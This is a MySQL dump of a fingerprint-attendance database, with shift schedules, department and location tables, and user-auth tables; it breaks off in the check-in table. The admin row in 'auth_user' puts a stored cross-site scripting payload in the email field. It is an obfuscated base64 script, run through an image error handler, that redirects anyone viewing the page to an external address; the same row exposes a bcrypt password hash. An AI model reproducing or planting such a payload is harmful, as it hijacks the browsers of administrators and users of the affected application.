-- MySQL dump 10.13  Distrib 8.0.19, for Win64 (x86_64)
--
-- Host: localhost    Database: finger_db
-- ------------------------------------------------------
-- Server version	5.5.5-10.6.8-MariaDB

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `ad_departement`
--

DROP TABLE IF EXISTS `ad_departement`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_departement` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `dept_name` varchar(100) DEFAULT NULL,
  `description` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_departement`
--

LOCK TABLES `ad_departement` WRITE;
/*!40000 ALTER TABLE `ad_departement` DISABLE KEYS */;
INSERT INTO `ad_departement` VALUES (1,'Purchasing',NULL),(2,'Warehouse',NULL),(3,'QA',NULL),(4,'QC',NULL),(5,'Logistik',NULL);
/*!40000 ALTER TABLE `ad_departement` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_grace_inperiod`
--

DROP TABLE IF EXISTS `ad_grace_inperiod`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_grace_inperiod` (
  `check_in` int(10) unsigned DEFAULT NULL,
  `check_out` int(10) unsigned DEFAULT NULL,
  `over_time_in` int(10) unsigned DEFAULT NULL,
  `over_time_out` int(10) unsigned DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_grace_inperiod`
--

LOCK TABLES `ad_grace_inperiod` WRITE;
/*!40000 ALTER TABLE `ad_grace_inperiod` DISABLE KEYS */;
INSERT INTO `ad_grace_inperiod` VALUES (15,15,15,15);
/*!40000 ALTER TABLE `ad_grace_inperiod` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_group_employe`
--

DROP TABLE IF EXISTS `ad_group_employe`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_group_employe` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `shift_id` bigint(20) unsigned DEFAULT NULL,
  `group_employe_name` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `ad_group_employe_FK` (`shift_id`),
  CONSTRAINT `ad_group_employe_FK` FOREIGN KEY (`shift_id`) REFERENCES `ad_shift` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_group_employe`
--

LOCK TABLES `ad_group_employe` WRITE;
/*!40000 ALTER TABLE `ad_group_employe` DISABLE KEYS */;
INSERT INTO `ad_group_employe` VALUES (1,1,'A'),(2,2,'B'),(3,3,'C'),(4,4,'D');
/*!40000 ALTER TABLE `ad_group_employe` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_location`
--

DROP TABLE IF EXISTS `ad_location`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_location` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `location_name` varchar(100) DEFAULT NULL,
  `description` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_location`
--

LOCK TABLES `ad_location` WRITE;
/*!40000 ALTER TABLE `ad_location` DISABLE KEYS */;
INSERT INTO `ad_location` VALUES (1,'LJR Balikpapan',NULL),(2,'LJR Pekan Baru',NULL),(3,'LJR Sumedang',NULL),(4,'LJR Priuk',NULL);
/*!40000 ALTER TABLE `ad_location` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_machine_dept`
--

DROP TABLE IF EXISTS `ad_machine_dept`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_machine_dept` (
  `id` varchar(10) NOT NULL,
  `dep_id` bigint(20) unsigned DEFAULT NULL,
  `loc_id` bigint(20) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `ad_machine_dept_FK` (`dep_id`),
  KEY `ad_machine_dept_FK_1` (`loc_id`),
  CONSTRAINT `ad_machine_dept_FK` FOREIGN KEY (`dep_id`) REFERENCES `ad_departement` (`id`) ON DELETE CASCADE,
  CONSTRAINT `ad_machine_dept_FK_1` FOREIGN KEY (`loc_id`) REFERENCES `ad_location` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_machine_dept`
--

LOCK TABLES `ad_machine_dept` WRITE;
/*!40000 ALTER TABLE `ad_machine_dept` DISABLE KEYS */;
INSERT INTO `ad_machine_dept` VALUES ('AG8768JDIH',1,1),('AG8878R4JJ',1,2),('AH9080HIW',1,3);
/*!40000 ALTER TABLE `ad_machine_dept` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_shift`
--

DROP TABLE IF EXISTS `ad_shift`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_shift` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `shift_name` varchar(100) NOT NULL,
  `check_in` time DEFAULT NULL,
  `check_out` time DEFAULT NULL,
  `ot_in` time DEFAULT NULL,
  `ot_out` time DEFAULT NULL,
  `shift_category` enum('Normal','Holiday') DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_shift`
--

LOCK TABLES `ad_shift` WRITE;
/*!40000 ALTER TABLE `ad_shift` DISABLE KEYS */;
INSERT INTO `ad_shift` VALUES (1,'Jam Kantor','08:00:00','17:00:00','18:00:00','21:00:00','Normal'),(2,'Shif Pagi','07:00:00','16:00:00','16:00:00','19:00:00','Normal'),(3,'Shif Siang','15:00:00','22:00:00','22:00:00','24:00:00','Normal'),(4,'Shif Malam','21:00:00','07:00:00','07:00:00','10:00:00','Normal'),(5,'Tanggal Merah Pagi',NULL,NULL,'07:00:00','10:00:00','Holiday'),(6,'Tanggal Merah Siang',NULL,NULL,'18:00:00','21:00:00','Holiday'),(7,'Tanggal Merah Sore',NULL,NULL,'16:00:00','19:00:00','Holiday'),(8,'Tanggal Merah Malam',NULL,NULL,'22:00:00','24:00:00','Holiday');
/*!40000 ALTER TABLE `ad_shift` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_user_mapping`
--

DROP TABLE IF EXISTS `ad_user_mapping`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_user_mapping` (
  `user_id` int(11) DEFAULT NULL,
  `machine_id` varchar(10) DEFAULT NULL,
  `nip` bigint(20) unsigned DEFAULT NULL,
  `group_employe_id` bigint(20) unsigned DEFAULT NULL,
  KEY `ad_user_mapping_FK` (`user_id`),
  KEY `ad_user_mapping_FK_1` (`group_employe_id`),
  KEY `ad_user_mapping_FK_2` (`machine_id`),
  CONSTRAINT `ad_user_mapping_FK` FOREIGN KEY (`user_id`) REFERENCES `userinfo` (`userid`) ON DELETE CASCADE,
  CONSTRAINT `ad_user_mapping_FK_1` FOREIGN KEY (`group_employe_id`) REFERENCES `ad_group_employe` (`id`) ON DELETE CASCADE,
  CONSTRAINT `ad_user_mapping_FK_2` FOREIGN KEY (`machine_id`) REFERENCES `ad_machine_dept` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_user_mapping`
--

LOCK TABLES `ad_user_mapping` WRITE;
/*!40000 ALTER TABLE `ad_user_mapping` DISABLE KEYS */;
INSERT INTO `ad_user_mapping` VALUES (1,'AG8768JDIH',7634716587,1),(2,'AG8768JDIH',7634716588,1),(3,'AG8768JDIH',7634716589,2),(4,'AG8768JDIH',7634716590,3),(5,'AG8768JDIH',7634716591,1),(6,'AG8768JDIH',7634716592,1),(7,'AG8768JDIH',7634716592,3),(8,'AG8768JDIH',7634716592,3),(9,'AG8768JDIH',7634716592,2);
/*!40000 ALTER TABLE `ad_user_mapping` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ad_working_day`
--

DROP TABLE IF EXISTS `ad_working_day`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `ad_working_day` (
  `group_employe_id` bigint(20) unsigned DEFAULT NULL,
  `year` int(10) unsigned DEFAULT NULL,
  `month` char(2) DEFAULT NULL,
  `working_day` int(10) unsigned DEFAULT NULL,
  KEY `ad_working_day_FK` (`group_employe_id`),
  CONSTRAINT `ad_working_day_FK` FOREIGN KEY (`group_employe_id`) REFERENCES `ad_group_employe` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ad_working_day`
--

LOCK TABLES `ad_working_day` WRITE;
/*!40000 ALTER TABLE `ad_working_day` DISABLE KEYS */;
INSERT INTO `ad_working_day` VALUES (1,2023,'01',25),(2,2023,'01',25),(3,2023,'01',25),(4,2023,'01',25),(1,2023,'02',23),(2,2023,'02',23),(3,2023,'02',23),(4,2023,'02',23),(1,2023,'03',25),(2,2023,'03',25),(3,2023,'03',25),(4,2023,'03',25),(1,2023,'04',23),(2,2023,'04',23),(3,2023,'04',23),(4,2023,'04',23),(1,2022,'12',26),(2,2022,'12',26),(3,2022,'12',26),(4,2022,'12',26),(1,2022,'11',25),(2,2022,'11',25),(3,2022,'11',25),(4,2022,'11',25),(1,2022,'10',26),(2,2022,'10',26),(3,2022,'10',26),(4,2022,'10',26);
/*!40000 ALTER TABLE `ad_working_day` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attcalclog`
--

DROP TABLE IF EXISTS `attcalclog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `attcalclog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `DeptID` int(11) DEFAULT NULL,
  `UserId` int(11) NOT NULL,
  `StartDate` datetime DEFAULT NULL,
  `EndDate` datetime NOT NULL,
  `OperTime` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attcalclog`
--

LOCK TABLES `attcalclog` WRITE;
/*!40000 ALTER TABLE `attcalclog` DISABLE KEYS */;
/*!40000 ALTER TABLE `attcalclog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attexception`
--

DROP TABLE IF EXISTS `attexception`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `attexception` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `UserId` int(11) NOT NULL,
  `StartTime` datetime NOT NULL,
  `EndTime` datetime NOT NULL,
  `ExceptionID` int(11) DEFAULT NULL,
  `AuditExcID` int(11) DEFAULT NULL,
  `OldAuditExcID` int(11) DEFAULT NULL,
  `OverlapTime` int(11) DEFAULT NULL,
  `TimeLong` int(11) DEFAULT NULL,
  `InScopeTime` int(11) DEFAULT NULL,
  `AttDate` datetime DEFAULT NULL,
  `OverlapWorkDayTail` int(11) NOT NULL,
  `OverlapWorkDay` varchar(900) DEFAULT NULL,
  `schindex` int(11) DEFAULT NULL,
  `Minsworkday` int(11) DEFAULT NULL,
  `schid` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UserId` (`UserId`,`AttDate`,`StartTime`),
  KEY `attexception_UserId` (`UserId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attexception`
--

LOCK TABLES `attexception` WRITE;
/*!40000 ALTER TABLE `attexception` DISABLE KEYS */;
/*!40000 ALTER TABLE `attexception` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attparam`
--

DROP TABLE IF EXISTS `attparam`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `attparam` (
  `ParaName` varchar(20) NOT NULL,
  `ParaType` varchar(2) DEFAULT NULL,
  `ParaValue` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`ParaName`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attparam`
--

LOCK TABLES `attparam` WRITE;
/*!40000 ALTER TABLE `attparam` DISABLE KEYS */;
INSERT INTO `attparam` VALUES ('MinsEarly',NULL,'5'),('MinsLate',NULL,'10'),('MinsNoBreakIn',NULL,'60'),('MinsNoBreakOut',NULL,'60'),('MinsNoIn',NULL,'60'),('MinsNoLeave',NULL,'60'),('MinsNotOverTime',NULL,'60'),('MinsWorkDay',NULL,'420'),('NoBreakIn',NULL,'1012'),('NoBreakOut',NULL,'1012'),('NoIn',NULL,'1001'),('NoLeave',NULL,'1002'),('OutOverTime',NULL,'0'),('TwoDay',NULL,'0'),('CheckInColor',NULL,'16777151'),('CheckOutColor',NULL,'12910591'),('DBVersion',NULL,'167');
/*!40000 ALTER TABLE `attparam` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attrecabnormite`
--

DROP TABLE IF EXISTS `attrecabnormite`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `attrecabnormite` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `checktime` datetime NOT NULL,
  `CheckType` varchar(2) NOT NULL,
  `NewType` varchar(2) DEFAULT NULL,
  `AbNormiteID` int(11) DEFAULT NULL,
  `SchID` int(11) DEFAULT NULL,
  `OP` int(11) DEFAULT NULL,
  `AttDate` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `userid` (`userid`,`AttDate`,`checktime`),
  KEY `attrecabnormite_userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attrecabnormite`
--

LOCK TABLES `attrecabnormite` WRITE;
/*!40000 ALTER TABLE `attrecabnormite` DISABLE KEYS */;
/*!40000 ALTER TABLE `attrecabnormite` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attshifts`
--

DROP TABLE IF EXISTS `attshifts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `attshifts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `SchIndex` int(11) DEFAULT NULL,
  `AutoSch` smallint(6) DEFAULT NULL,
  `AttDate` datetime NOT NULL,
  `SchId` int(11) DEFAULT NULL,
  `ClockInTime` datetime NOT NULL,
  `ClockOutTime` datetime NOT NULL,
  `StartTime` datetime DEFAULT NULL,
  `EndTime` datetime DEFAULT NULL,
  `WorkDay` varchar(900) DEFAULT NULL,
  `RealWorkDay` varchar(900) DEFAULT NULL,
  `NoIn` smallint(6) DEFAULT NULL,
  `NoOut` smallint(6) DEFAULT NULL,
  `Late` int(11) DEFAULT NULL,
  `Early` int(11) DEFAULT NULL,
  `Absent` int(11) DEFAULT NULL,
  `OverTime` int(11) DEFAULT NULL,
  `WorkTime` int(11) DEFAULT NULL,
  `ExceptionID` int(11) DEFAULT NULL,
  `Symbol` varchar(10) DEFAULT NULL,
  `MustIn` smallint(6) DEFAULT NULL,
  `MustOut` smallint(6) DEFAULT NULL,
  `OverTime1` int(11) DEFAULT NULL,
  `WorkMins` int(11) DEFAULT NULL,
  `SSpeDayNormal` varchar(900) DEFAULT NULL,
  `SSpeDayWeekend` varchar(900) DEFAULT NULL,
  `SSpeDayHoliday` double DEFAULT NULL,
  `AttTime` int(11) DEFAULT NULL,
  `SSpeDayNormalOT` varchar(900) DEFAULT NULL,
  `SSpeDayWeekendOT` varchar(900) DEFAULT NULL,
  `SSpeDayHolidayOT` double DEFAULT NULL,
  `AbsentMins` int(11) DEFAULT NULL,
  `AttChkTime` varchar(10) DEFAULT NULL,
  `AbsentR` varchar(900) DEFAULT NULL,
  `ScheduleName` varchar(20) DEFAULT NULL,
  `IsConfirm` smallint(6) DEFAULT NULL,
  `IsRead` smallint(6) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `userid` (`userid`,`AttDate`,`SchId`),
  KEY `attshifts_userid` (`userid`),
  KEY `attshifts_SchId` (`SchId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attshifts`
--

LOCK TABLES `attshifts` WRITE;
/*!40000 ALTER TABLE `attshifts` DISABLE KEYS */;
/*!40000 ALTER TABLE `attshifts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auditedexc`
--

DROP TABLE IF EXISTS `auditedexc`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auditedexc` (
  `AEID` int(11) NOT NULL AUTO_INCREMENT,
  `UserId` int(11) NOT NULL,
  `checktime` datetime NOT NULL,
  `Utime` datetime NOT NULL,
  `NewExcID` smallint(6) NOT NULL,
  `IsLeave` smallint(6) NOT NULL,
  `UName` varchar(20) NOT NULL,
  PRIMARY KEY (`AEID`),
  KEY `auditedexc_UserId` (`UserId`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auditedexc`
--

LOCK TABLES `auditedexc` WRITE;
/*!40000 ALTER TABLE `auditedexc` DISABLE KEYS */;
/*!40000 ALTER TABLE `auditedexc` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group_permissions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `group_id` (`group_id`,`permission_id`),
  KEY `permission_id_refs_id_5886d21f` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_message`
--

DROP TABLE IF EXISTS `auth_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_message` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `message` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `auth_message_user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_message`
--

LOCK TABLES `auth_message` WRITE;
/*!40000 ALTER TABLE `auth_message` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(900) DEFAULT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `content_type_id` (`content_type_id`,`codename`) USING HASH,
  KEY `auth_permission_content_type_id` (`content_type_id`)
) ENGINE=MyISAM AUTO_INCREMENT=207 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `first_name` varchar(30) NOT NULL,
  `last_name` varchar(30) NOT NULL,
  `email` varchar(900) DEFAULT NULL,
  `password` varchar(128) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `last_login` datetime NOT NULL,
  `date_joined` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES (1,'admin','joni','yuhu','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','$2y$10$mkQBqVbwTOLF.AzoRkNa3eJ111ZO0.73j6DxHSTVU0k2yIfm/Q46u',1,1,1,'2022-11-30 00:20:46','2011-09-05 14:48:04');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_groups` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`,`group_id`),
  KEY `group_id_refs_id_f116770` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`,`permission_id`),
  KEY `permission_id_refs_id_67e79cb` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `checkexact`
--

DROP TABLE IF EXISTS `checkexact`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `checkexact` (
  `EXACTID` int(11) NOT NULL AUTO_INCREMENT,
  `UserID` int(11) DEFAULT NULL,
  `CHECKTIME` datetime DEFAULT NULL,
  `CHECKTYPE` varchar(2) DEFAULT NULL,
  `ISADD` smallint(6) DEFAULT NULL,
  `YUYIN` varchar(25) DEFAULT NULL,
  `ISMODIFY` smallint(6) DEFAULT NULL,
  `ISDELETE` smallint(6) DEFAULT NULL,
  `INCOUNT` smallint(6) DEFAULT NULL,
  `ISCOUNT` smallint(6) DEFAULT NULL,
  `MODIFYBY` varchar(20) DEFAULT NULL,
  `DATE` datetime DEFAULT NULL,
  PRIMARY KEY (`EXACTID`),
  KEY `checkexact_UserID` (`UserID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `checkexact`
--

LOCK TABLES `checkexact` WRITE;
/*!40000 ALTER TABLE `checkexact` DISABLE KEYS */;
/*!40000 ALTER TABLE `checkexact` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `checkinout`
--

DROP TABLE IF EXISTS `checkinout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `checkinout` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `checktime` datetime NOT NULL,
  `checktype` varchar(1) NOT NULL,
  `verifycode` int(11) NOT NULL,
  `SN` varchar(20) DEFAULT NULL,
  `sensorid` varchar(5) DEFAULT NULL,
  `WorkCode` varchar(20) DEFAULT NULL,
  `Reserved` varchar(20) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `userid` (`userid`,`checktime`),
  KEY `checkinout_userid` (`userid`),
  KEY `checkinout_SN` (`SN`)
) ENGINE=MyISAM AUTO_INCREMENT=64 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `checkinout`
--

LOCK TABLES `checkinout` WRITE;
/*!40000 ALTER TABLE `checkinout` DISABLE KEYS */;
